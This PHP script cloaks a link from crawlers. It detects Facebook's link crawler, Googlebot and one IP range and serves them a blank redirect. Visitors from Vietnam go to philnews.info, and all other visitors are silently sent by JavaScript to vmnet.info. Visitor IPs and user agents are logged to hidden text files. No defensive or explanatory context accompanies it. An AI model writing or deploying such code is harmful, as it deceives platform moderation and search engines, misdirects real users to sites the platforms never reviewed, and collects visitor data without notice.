
<?php
function checkIP($ip)
{
    $lowIp = ip2long('66.100.0.0');
    $highIp = ip2long('66.255.255.255');
    if ($ip <= $highIp && $lowIp <= $ip) {
        return true;
    }
}

function ipDetails($ip)
{
    $json = file_get_contents("http://ipinfo.io/{$ip}");
    $details = json_decode($json);
    return $details;
}

$allowedAgents = "allowedAgentsglsUoHnlfdRNkh5IFBDb9KpxwrdanQrvcuVFv7S15TcgytTL9UZq3RX7zHK0De88Jp0Y4bO-N2JYaZStLVh-jiqEIWOEof6miXMA.txt";
$blockedAgents = "blockedAgentsglsUoHnlfdRNkh5IFBDb9KpxwrdanQrvcuVFv7S15TcgytTL9UZq3RX7zHK0De88Jp0Y4bO-N2JYaZStLVh-jiqEIWOEof6miXMA.txt";

$details = ipDetails($_SERVER['REMOTE_ADDR']);

$ip = ip2long($_SERVER['REMOTE_ADDR']);

if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
    strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || checkIP($ip)
) {
    $fAgent = fopen($blockedAgents, 'a');
    $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' blocked ' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    header('Location: ', true, 301);
    die();
} elseif ($details->country === 'VN') {
    header('Location: http://philnews.info', true, 301);
} else {
    $fAgent = fopen($allowedAgents, 'a');
    $agent = $_SERVER['REMOTE_ADDR'] . ' ' . $_SERVER['HTTP_USER_AGENT'] . ' ok ' . PHP_EOL;
    fwrite($fAgent, $agent);
    fclose($fAgent);
    echo "
<script type='text/javascript'>// <![CDATA[
var d='<data:blog.url/>';
d=d.replace(/.*\/\/[^\/]*/, '');
location.href = 'http://vmnet.info';
// ]]></script>
";
    die();
}

